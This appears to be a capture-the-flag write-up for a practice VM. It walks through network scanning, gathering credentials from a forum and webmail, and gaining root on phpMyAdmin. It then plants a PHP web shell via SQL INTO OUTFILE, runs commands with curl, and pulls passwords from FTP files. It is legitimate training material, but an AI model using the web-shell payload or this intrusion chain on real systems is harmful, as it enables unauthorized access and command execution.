# Writeup1:
# Part1: Find something

![Iso launched](/img/begin_vm.png)

I guess we need to find IP of this Vm, at moment it was the unique way to continue
But with command **ifconfig**, the Vm isn't on network..

## Explore to find, but what ?
- We launched the iso on linux under Virtualbox, firstly we need to create a Host Network Manager to acces its IP
- After set up Network, go to setting about VM `tab:Network` and change `Attached to:`->`NAT`to`Host-only Adapter`
    * Name of your Host Network will be appear below, fine now **ifconfig** works as expected

```c
vboxnet*: flags=4163<UP,BROADCAST,RUNNING,MULTICAST>  mtu 1500
            inet 192.168.56.1  netmask 255.255.255.0  broadcast 192.168.56.255
        inet6 fe80::800:27ff:fe00:0  prefixlen 64  scopeid 0x20<link>
        ether 0a:00:27:00:00:00  txqueuelen 1000  (Ethernet)
        ...
```

- To find IP, use nmap without flag to find it quickly, then launch a new nmap scan with some flags

```cs
└─$ nmap 192.168.56.1/24
...
Nmap scan report for 192.168.56.3
...

└─$ sudo nmap -sV --script=http-enum 192.168.56.3
Starting Nmap 7.94 ( https://nmap.org ) at 2023-10-08 16:40 EDT
Nmap scan report for 192.168.56.3
Host is up (0.00090s latency).
Not shown: 994 closed tcp ports (reset)
PORT    STATE SERVICE  VERSION
21/tcp  open  ftp      vsftpd 2.0.8 or later
22/tcp  open  ssh      OpenSSH 5.9p1 Debian 5ubuntu1.7 (Ubuntu Linux; protocol 2.0)
80/tcp  open  http     Apache httpd 2.2.22 ((Ubuntu))
|_http-server-header: Apache/2.2.22 (Ubuntu)
143/tcp open  imap     Dovecot imapd
443/tcp open  ssl/http Apache httpd 2.2.22
|_http-server-header: Apache/2.2.22 (Ubuntu)
| http-enum: 
|   /forum/: Forum
|   /phpmyadmin/: phpMyAdmin
|   /webmail/src/login.php: squirrelmail version 1.4.22
|_  /webmail/images/sm_logo.png: SquirrelMail
993/tcp open  ssl/imap Dovecot imapd
Service Info: Host: 127.0.1.1; OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 14.45 seconds
```
* nmap scan reveals a WebServer Apache/2.2.22
    * 1 route on 80 port
    * 3 routes on 443port (forum, phpmyadmin, webmail)

* And with ***dirb*** it's more interesting !
```cs
└─$ dirb https://192.168.56.3 -R
...
GENERATED WORDS: 4612                                                          

---- Scanning URL: https://192.168.56.3/ ----
+ https://192.168.56.3/cgi-bin/ (CODE:403|SIZE:289)                                           
==> DIRECTORY: https://192.168.56.3/forum/                                                    
==> DIRECTORY: https://192.168.56.3/phpmyadmin/                                               
+ https://192.168.56.3/server-status (CODE:403|SIZE:294)                                      
==> DIRECTORY: https://192.168.56.3/webmail/                                                  

---- Entering directory: https://192.168.56.3/forum/ ----
(?) Do you want to scan this directory (y/n)? y                                                + https://192.168.56.3/forum/backup (CODE:403|SIZE:293)                                       
--> Testing: https://192.168.56.3/forum/backup-db                                             
+ https://192.168.56.3/forum/config (CODE:403|SIZE:293)                                       
==> DIRECTORY: https://192.168.56.3/forum/images/                                             
==> DIRECTORY: https://192.168.56.3/forum/includes/                                           
+ https://192.168.56.3/forum/index (CODE:200|SIZE:4935)                                       
+ https://192.168.56.3/forum/index.php (CODE:200|SIZE:4935)                                   
==> DIRECTORY: https://192.168.56.3/forum/js/                                                 
==> DIRECTORY: https://192.168.56.3/forum/lang/                                               
==> DIRECTORY: https://192.168.56.3/forum/modules/                                            
==> DIRECTORY: https://192.168.56.3/forum/templates_c/                                        
==> DIRECTORY: https://192.168.56.3/forum/themes/                                             
==> DIRECTORY: https://192.168.56.3/forum/update/
...
```

## Root, but not really

* On the *forum*, with 6 users (admin, lmerard, qudevide, thor, wandre and zaz)
* There is post `Probleme login ?` by `lmezard`, and we find this user `!q\]Ej?*5K5cy*AJ`
    * We can connect to the *forum* with this logs
    * And we find its mail *`laurie@borntosec.net `*, now we can try to connect in *webmail* route, that works!

* On *webmail*, there is mail send by `qudevide@mail.borntosec.net` on Subject `DB Access` which contains an access log `root/Fg-'kKXBj87E:aJ$`, probably for the DB(*phpmyadmin*)
    * That works, we are root of the database

* In `forum_db` struct `mlf2_userdata`, we find the all users found earlier, with their password hashed
    * And in `mysql` struct `user`, I guess these are the database admin profiles (Passwords seems to be hashed in SHA1, MySQL4.1/MySQL5)
    * Tried to decrypt them without success..

* Try to make a [reverse](https://en.wikipedia.org/wiki/Shell_shoveling)/[web](https://en.wikipedia.org/wiki/Web_shell) shell

* Let try to inject it, on phpmyadmin in `SQL` tab
```sql
SELECT "<?php system($_GET['cmd'] . '2>&1'); ?>" INTO OUTFILE '/var/www/forum/templates_c/webshell.php'
```
* That works
```bash
└─$ curl --insecure "https://192.168.56.3/forum/templates_c/webshell.php?cmd=pwd"
/var/www/forum/templates_c
```
* Finaly find new log at `/home/LOOKATME/password` -> `lmezard:G!@M6f4Eatau{sF"`, doubtless for ssh or ftp connect log

```bash
└─$ ftp lmezard@192.168.56.3
Connected to 192.168.56.3.
220 Welcome on this server
331 Please specify the password.
Password: 
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.
```

* We have 2 file into the ftp server, let's donwload them
```bash
-rwxr-x---    1 1001     1001           96 Oct 15  2015 README
-rwxr-x---    1 1001     1001       808960 Oct 08  2015 fun
```
* README and fun can be read now
    - fun seems a *tar* file containing many pcap
```bash
└─$ cat README 
Complete this little challenge and use the result as password for user 'laurie' to login in ssh
└─$ file fun
fun: POSIX tar archive (GNU)
└─$ ls ft_fun 
00M73.pcap  55WLW.pcap  ATLJ4.pcap  GX39Y.pcap  NJBCM.pcap  T7R09.pcap
...
```
* pcap file main has corrupt, cause it split in some parts
    - Note: with *cat*, we can read and concate this files
```bash
└─$ cat * > pcap.out
...
int main() {
	printf("M");
	printf("Y");
	printf(" ");
	printf("P");
	printf("A");
	printf("S");
	printf("S");
	printf("W");
	printf("O");
	printf("R");
	printf("D");
	printf(" ");
	printf("I");
	printf("S");
	printf(":");
	printf(" ");
	printf("%c",getme1());
	printf("%c",getme2());
	printf("%c",getme3());
	printf("%c",getme4());
	printf("%c",getme5());
	printf("%c",getme6());
	printf("%c",getme7());
	printf("%c",getme8());
	printf("%c",getme9());
	printf("%c",getme10());
	printf("%c",getme11());
	printf("%c",getme12());
	printf("\n");
	printf("Now SHA-256 it and submit");
...
```
* After investigate the file, we found all getmexx, we got`laurie`'s password
```cs
Iheartpwnage -> 330b845f32185747e4f8ca15d40ca59796035c89ea809fb5d30f4da83ecf45a4
```
* Now we can access to ssh port
    - And same previous, let find the password of *thor*
```bash
laurie@192.168.56.3's password: 
laurie@BornToSecHackMe:~$ ls -l
total 27
-rwxr-x--- 1 laurie laurie 26943 Oct  8  2015 bomb
-rwxr-x--- 1 laurie laurie   158 Oct  8  2015 README
laurie@BornToSecHackMe:~$ cat README 
Diffuse this bomb!
When you have all the password use it as "thor" user with ssh.

HINT:
P
 2
 b

o
4

NO SPACE IN THE PASSWORD (password is case sensitive).
laurie@BornToSecHackMe:~$ ./bomb 
Welcome this is my little bomb !!!! You have 6 stages with
only one life good luck !! Have a nice day!
```

